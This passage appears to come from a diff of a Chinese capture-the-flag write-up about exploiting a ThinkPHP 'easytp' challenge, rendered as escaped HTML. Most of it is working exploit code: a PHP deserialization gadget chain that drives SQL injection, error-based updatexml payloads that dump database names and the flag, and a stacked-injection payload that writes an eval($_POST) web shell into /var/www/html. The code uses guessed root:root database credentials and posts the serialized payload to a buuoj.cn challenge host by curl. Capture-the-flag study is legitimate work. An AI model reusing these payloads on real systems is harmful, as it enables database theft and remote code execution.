+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219200242251.png" alt="image-20211219200242251">&lt;/p>
 &lt;p>看到了mysql用户，尝试弱口令得到root: root&lt;/p>
 &lt;p>之后就可以把我们的伪服务端撤了，换成真服务端的，进行一个注入&lt;/p>
 &lt;ul>
 &lt;li>使用目标的数据库配置再次进行反序列化&lt;/li>
 &lt;li>触发&lt;code>DELETE&lt;/code>语句的SQL注入&lt;/li>
 &lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
-&lt;span style="color:#111">);&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们还可以把堆叠打开，用堆叠注入写shell，也就是本题的exp（参考&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">赵总的exp&lt;/a> 赵总牛逼&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 开启才能读取文件
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_MULTI_STATEMENTS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 打开堆叠注入
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;3306&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 猜出弱口令
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
-&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75715e">// 堆叠注入写入shell
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=1;select &amp;#39;&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">_POST[amiz]);?&amp;gt;&amp;#39; into outfile &amp;#39;/var/www/html/amiz.php&amp;#39;;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
-&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
-&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
